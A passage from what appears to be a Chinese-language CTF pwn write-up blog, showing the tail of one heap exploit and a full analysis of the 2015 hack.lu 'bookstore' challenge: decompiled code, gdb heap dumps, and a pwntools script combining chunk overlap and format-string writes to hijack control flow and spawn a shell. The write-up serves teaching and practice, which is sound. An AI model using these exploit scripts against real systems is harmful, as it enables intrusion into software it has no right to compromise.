create(<span class="number">0x10</span>, <span class="string">"2222"</span>)  <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># overwrite heap 1's struct's size to 0x41</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span> * <span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">    <span class="comment"># trigger heap 1's struct to fastbin 0x40</span></span><br><span class="line">    <span class="comment"># heap 1's content to fastbin 0x20</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># new heap 1's struct will point to old heap 1's content, size 0x20</span></span><br><span class="line">    <span class="comment"># new heap 1's content will point to old heap 1's struct, size 0x30</span></span><br><span class="line">    <span class="comment"># that is to say we can overwrite new heap 1's struct</span></span><br><span class="line">    <span class="comment"># here we overwrite its heap content pointer to free@got</span></span><br><span class="line">    create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">'free'</span>]))  <span class="comment">#1</span></span><br><span class="line">    <span class="comment">#create(0x30, p64(0x1234567890))  #1</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    <span class="comment"># leak freeaddr</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">    free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">    libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    <span class="comment">#gdb.attach(r)</span></span><br><span class="line">    <span class="comment"># overwrite free@got with system addr</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line">    <span class="comment"># trigger system("/bin/sh")</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><h2 id="1-2-2015-hacklu-bookstore"><a href="#1-2-2015-hacklu-bookstore" class="headerlink" title="1.2. 2015 hacklu bookstore"></a>1.2. 2015 hacklu bookstore</h2><h3 id="1-2-1-功能分析"><a href="#1-2-1-功能分析" class="headerlink" title="1.2.1. 功能分析"></a>1.2.1. 功能分析</h3><p>先进行功能分析</p><ol><li>有编辑功能，编辑已存在的1,2堆块，可溢出</li><li>删除功能，删除已存在的1,2堆块，uaf</li><li>合并功能，将1,2两个堆块合并,格式化字符串</li></ol><h3 id="1-2-2-漏洞点分析"><a href="#1-2-2-漏洞点分析" class="headerlink" title="1.2.2. 漏洞点分析"></a>1.2.2. 漏洞点分析</h3><ol><li>漏洞点1(任意写，\n才结束)</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">edit_order</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> cnt; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v3 != <span class="string">'\n'</span> )<span class="comment">//关键点</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    idx = cnt++;</span><br><span class="line">    a1[idx] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[cnt - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>漏洞点2(uaf)</li></ol><p>free后指针没置空</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">delete_order</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">free</span>(a1); <span class="comment">//重点</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>格式化字符串</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">char</span> *first_order; <span class="comment">// [rsp+18h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> *second_order; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  first_order = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  second_order = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !first_order || !second_order || !dest )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">"Something failed!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">" _____          _   _                 _          _                   _ \n"</span></span><br><span class="line">    <span class="string">"/__   \\_____  _| |_| |__   ___   ___ | | __  ___| |_ ___  _ __ ___  / \\\n"</span></span><br><span class="line">    <span class="string">"  / /\\/ _ \\ \\/ / __| '_ \\ / _ \\ / _ \\| |/ / / __| __/ _ \\| '__/ _ \\/  /\n"</span></span><br><span class="line">    <span class="string">" / / |  __/&gt;  &lt;| |_| |_) | (_) | (_) |   &lt;  \\__ \\ || (_) | | |  __/\\_/ \n"</span></span><br><span class="line">    <span class="string">" \\/   \\___/_/\\_\\\\__|_.__/ \\___/ \\___/|_|\\_\\ |___/\\__\\___/|_|  \\___\\/   \n"</span></span><br><span class="line">    <span class="string">"Crappiest and most expensive books for your college education!\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"We can order books for you in case they're not in stock.\n"</span></span><br><span class="line">    <span class="string">"Max. two orders allowed!\n"</span>);</span><br><span class="line">LABEL_14:</span><br><span class="line">  <span class="keyword">while</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1: Edit order 1"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2: Edit order 2"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3: Delete order 1"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"4: Delete order 2"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"5: Submit"</span>);</span><br><span class="line">    fgets(&amp;s, <span class="number">0x80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( s )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Enter first order:"</span>);</span><br><span class="line">        edit_order(first_order);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">"Your order is submitted!\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Enter second order:"</span>);</span><br><span class="line">        edit_order(second_order);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">"Your order is submitted!\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        delete_order(first_order);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        delete_order(second_order);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        v5 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x140</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          fwrite(<span class="string">"Something failed!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        submit(v5, first_order, second_order);</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(dest);<span class="comment">//格式化字符串</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-3-漏洞利用过程"><a href="#1-2-3-漏洞利用过程" class="headerlink" title="1.2.3. 漏洞利用过程"></a>1.2.3. 漏洞利用过程</h3><p>这题有三个明显的洞，比原来那些只有一个洞的看起来似乎简单些？实际相反，这道题利用起来难度比前面的还大，因为这个洞不好利用，我自己研究了好久也无果，然后找writeup<br>看了看雪大佬的文章才知道这题怎么利用的</p><p>开始我在想如何利用格式化字符串的洞，因为格式化字符串的洞在合并过后才会使用，而我没想到什么便捷方法能修改第三块堆块的内容，他只能被覆盖为默认的<strong>Your order is submitted!\n</strong>，后来才知道用overlaping后可以覆盖到第三块堆块的内容，不过还是得精心布置堆才可以利用到</p><ol><li>开头程序malloc(0x80)申请了三个堆块，我们将第二块free掉</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/100gx 0x1b8d010-0x010</span><br><span class="line">0x1b8d000:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块1</span></span><br><span class="line">0x1b8d010:	0x0000000074736574	0x0000000000000000</span><br><span class="line">0x1b8d020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d090:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块2，溢出修改处</span></span><br><span class="line">0x1b8d0a0:	0x0000000000000000	0x0000000000000000 <span class="comment">#数据部分</span></span><br><span class="line">0x1b8d0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d120:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块3</span></span><br><span class="line">0x1b8d130:	0x64726f2072756f59	0x7573207369207265</span><br><span class="line">0x1b8d140:	0x2164657474696d62	0x000000000000000a</span><br><span class="line">0x1b8d150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d1a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d1b0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x1b8d1c0:	0x696d627553203a35	0x20726564726f0a74</span><br><span class="line">0x1b8d1d0:	0x216465776f0a0a32	0x6163206e6920750a</span><br><span class="line">0x1b8d1e0:	0x2779656874206573	0x6920746f6e206572</span><br><span class="line">0x1b8d1f0:	0x2e6b636f7473206e	0x5f0a216e6f69740a</span><br><span class="line">0x1b8d200:	0x0a2020202f5c5f5f	0x0000000000000000</span><br><span class="line">0x1b8d210:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d220:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d230:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d240:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d250:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d270:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d290:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d300:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d310:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><ol start="2"><li><p>编辑第一块堆块内容，溢出到第二块的size，修改第二块的size为0x150，为什么是0x150?(因为你看程序在合并的时候有个malloc(0x140)，这样合并的时候申请的堆块就会跑到这上面来，也就是说我们第二块堆块跟第三块堆块这时候会重合</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x1695028-0x28</span><br><span class="line">0x1695000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x1695010:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x1695020:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x1695030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695080:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x1695090:	0x0000000000000000	0x0000000000000151</span><br><span class="line">0x16950a0:	0x00007f0e99412b00	0x00007f0e99412b78</span><br><span class="line">0x16950b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695120:	0x0000000000000090	0x0000000000000090</span><br><span class="line">0x1695130:	0x64726f2072756f59	0x7573207369207265</span><br><span class="line">0x1695140:	0x2164657474696d62	0x000000000000000a</span><br><span class="line">0x1695150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></li><li><p>然后submit的时候具体会变成什么样呢?，会先复制<strong>Order 1: **，然后在复制chunk1里的内容，在复制chunk2里的内容，注意注意chunk2的内容现在是什么，是前面的</strong>Order 1: **在加上chunk1的内容，因为堆块2的指针还指向chunk2的数据部分，所以会复制两次</p></li><li><p>就是<strong>Order 1: **+chunk1+’\n’+</strong>Order 2: <strong>+</strong>Order 1: **+chun1+’\n’</p></li><li><p>如果我们要利用格式化字符串的洞的话，要精确复制到堆块3的size部分后就停止，到这部分大小是0x90</p></li><li><p>也就是说我们<strong>Order 1: **+chunk1+’\n’+</strong>Order 2: <strong>+</strong>Order 1: *<em>这个的大小要为0x90，求出chunk大小，0x90-9</em>3-1=0x88-0x1c=0x74</p></li><li><p>所以我们可以在前面0x74里写格式化字符串的利用，后面就利用得上了</p></li></ol><p>这是合并后的结果</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/56gx 0x6e6028-0x28</span><br><span class="line">0x6e6000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x6e6010:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x6e6020:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x6e6030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6080:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x6e6090:	0x0000000000000000	0x0000000000000151</span><br><span class="line">0x6e60a0:	0x3a3120726564724f	0x2563373136322520</span><br><span class="line">0x6e60b0:	0x3325516e68243331	0x2438322550702431</span><br><span class="line">0x6e60c0:	0x6161616161616170	0x6161616161616161</span><br><span class="line">0x6e60d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e60e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e60f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6100:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6110:	0x6161616161616161	0x724f0a6161616161</span><br><span class="line">0x6e6120:	0x4f203a3220726564	0x203a312072656472</span><br><span class="line">0x6e6130:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x6e6140:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x6e6150:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6160:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6170:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6180:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6190:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e61a0:	0x64724f0a61616161	0x000a203a32207265</span><br><span class="line">0x6e61b0:	0x0000000000000000	0x0000000000000411</span><br></pre></td></tr></table></figure><ol start="8"><li>既然是堆题我就不再讲格式化字符串利用了，后面先利用格式化字符串修改.fini的地址，这样能多返回一次到main函数，同时泄露libc函数地址，为什么修改.fini里的地址能多返回一次main函数呢，请看</li></ol><p><span class="exturl" data-url="aHR0cHM6Ly9sdW9tdXhpYW94aWFvLmNvbS8/cD01MTY=" title="https://luomuxiaoxiao.com/?p=516">linux_x86程序启动中文版<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL2RicC1jb25zdWx0aW5nLmNvbS90dXRvcmlhbHMvZGVidWdnaW5nL2xpbnV4UHJvZ3JhbVN0YXJ0dXAuaHRtbA==" title="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">linux_x86程序启动英文版<i class="fa fa-external-link"></i></span><br>这两篇文章一样的，不过一个中文版，一个英文版，建议英文好的同学读原版，因为.fini在exit前会进行调用，所以修改后能执行多一次main函数</p><ol start="9"><li>这时候发觉泄露出libc后不知道修改哪个函数了，因为调用printf后再也没函数用了，这时候思路又断了</li><li>所以这时候想想别的办法，发觉栈上存了一个与存main函数返回地址的指针存在一定偏移的地址，所以泄露出来后，在减掉那个固定偏移就可以修改main函数返回地址了</li></ol><p>注意：这里格式化字符串内容存在堆里，指针存在栈上，所以我们fgets输入的才是对应上的偏移</p><h3 id="1-2-4-exp"><a href="#1-2-4-exp" class="headerlink" title="1.2.4. exp"></a>1.2.4. exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'books'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'books'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    p = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    No RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span> :</span></span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvregex(<span class="string">r'''Enter (.*?) order:\n'''</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span> :</span></span><br><span class="line">    p.sendline(str(idx+<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(content)</span> :</span></span><br><span class="line">    p.sendline(<span class="string">'5'</span>+ <span class="string">'\x00'</span>*<span class="number">7</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    fini_array = <span class="number">0x6011B8</span></span><br><span class="line">    main_addr = <span class="number">0x400A39</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#first step </span></span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    fmstr = <span class="string">"%&#123;&#125;c%&#123;&#125;$hnQ%&#123;&#125;$pP%&#123;&#125;$p"</span>.format(<span class="number">0xA39</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">28</span>)</span><br><span class="line">    payload = fmstr.ljust(<span class="number">0x74</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x88</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x151</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    <span class="comment">#offset=13</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    submit(p64(fini_array))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        p.recvuntil(<span class="string">'Q'</span>)</span><br><span class="line">    __libc_start_main_addr = int(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]<span class="number">-240</span></span><br><span class="line">    ret_addr = int(p.recv(<span class="number">15</span>)[<span class="number">1</span>:], <span class="number">16</span>)<span class="number">-0x1e8</span></span><br><span class="line">    one_gadget_offset = <span class="number">0x45216</span> </span><br><span class="line">    <span class="comment">#one_gadget_offset = 0x4526a </span></span><br><span class="line">    <span class="comment">#one_gadget_offset = 0xf02a4</span></span><br><span class="line">    <span class="comment">#one_gadget_offset = 0xf1147</span></span><br><span class="line">    one_gadget = libc_base + one_gadget_offset</span><br><span class="line">    p.success(<span class="string">"libc_base-&gt; 0x%x"</span> % libc_base)</span><br><span class="line">    p.success(<span class="string">"ret_addr-&gt; 0x%x"</span> % ret_addr)</span><br><span class="line">    p.success(<span class="string">"one_gadget-&gt; 0x%x"</span> % one_gadget)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#second step</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    part1 = ((one_gadget&gt;&gt;<span class="number">16</span>)&amp; <span class="number">0xffff</span>)</span><br><span class="line">    part2 = (one_gadget &amp; <span class="number">0xffff</span>)</span><br><span class="line"></span><br><span class="line">    part =[</span><br><span class="line">        (part1, p64(ret_addr+<span class="number">2</span>)),</span><br><span class="line">        (part2, p64(ret_addr))</span><br><span class="line">    ]</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>])</span><br><span class="line">    size = [i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> part]</span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    print(size)</span><br><span class="line">    print(addr)</span><br><span class="line">    fmstr = <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(size[<span class="number">0</span>], <span class="number">13</span>)</span><br><span class="line">    fmstr += <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(size[<span class="number">1</span>]-size[<span class="number">0</span>], <span class="number">14</span>)</span><br><span class="line">    payload = fmstr.ljust(<span class="number">0x74</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x88</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x151</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    <span class="comment">#offset=13</span></span><br><span class="line">    submit(addr)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h2 id="1-3-总结"><a href="#1-3-总结" class="headerlink" title="1.3. 总结"></a>1.3. 总结</h2><ol><li>这道题堆部分难点部分想到了就不难，没想到就难，就是要利用那个部分溢出到第三个堆块</li><li>其余部分就全是格式化字符串的利用了，没什么好讲的</li><li>这道题拿到shell也偏废时间，最主要直接看exp我看不懂，后面去看文章才看懂的</li></ol><h2 id="1-4-参考链接"><a href="#1-4-参考链接" class="headerlink" title="1.4. 参考链接"></a>1.4. 参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDY3ODMuaHRt" 